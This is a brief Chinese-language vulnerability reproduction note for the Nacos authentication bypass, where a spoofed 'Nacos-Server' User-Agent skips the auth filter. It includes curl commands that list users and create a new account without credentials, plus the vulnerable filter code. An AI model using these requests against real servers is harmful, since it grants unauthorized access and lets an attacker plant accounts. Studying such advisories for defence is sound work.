# nacos未授权漏洞
https://github.com/alibaba/nacos/issues/4593
使用UA绕过权限验证

# 漏洞复现
version <= 2.0.0-ALPHA.1

启动nacos

```text
cd nacos/bin
sh startup.sh -m standalone
```

```text
curl XGET 'http://192.168.0.111:8848/nacos/v1/auth/users?pageNo=1&pageSize=9' -H 'User-Agent: Nacos-Server'
```

```text
curl -XPOST 'http://192.168.0.111:8848/nacos/v1/auth/users?username=test&password=test' -H 'User-Agent: Nacos-Server'
```

# exp

# 修复
version = 1.4.1修复

# 漏洞原理

com.alibaba.nacos.core.auth.AuthFilter#doFilter

```text
@Override
public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
        throws IOException, ServletException {
    
    // 未开启鉴权
    if (!authConfigs.isAuthEnabled()) {
        chain.doFilter(request, response);
        return;
    }
    
    HttpServletRequest req = (HttpServletRequest) request;
    HttpServletResponse resp = (HttpServletResponse) response;
    
    String userAgent = WebUtils.getUserAgent(req);
    
    // Nacos-Server的UA
    if (StringUtils.startsWith(userAgent, Constants.NACOS_SERVER_HEADER)) {
        chain.doFilter(request, response);
        return;
    }
    
    ...
}
```